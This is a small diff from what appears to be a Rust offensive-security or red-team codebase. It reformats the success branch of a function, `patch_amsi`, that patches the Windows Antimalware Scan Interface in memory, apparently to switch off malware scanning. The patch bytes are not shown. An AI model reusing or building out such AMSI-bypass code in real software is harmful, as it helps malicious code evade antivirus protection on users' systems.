@@ -185,7 +185,10 @@ pub unsafe fn patch_amsi() -> Result<(), &'static str> {
         None => return Err("amsi not loaded"),
     };
     match write_patch(addr, &AMSI_PATCH) {
-        Ok(()) => { mark_amsi_patched(); Ok(()) }
+        Ok(()) => {
+            mark_amsi_patched();
+            Ok(())
+        }
         Err(e) => Err(e),
     }
 }
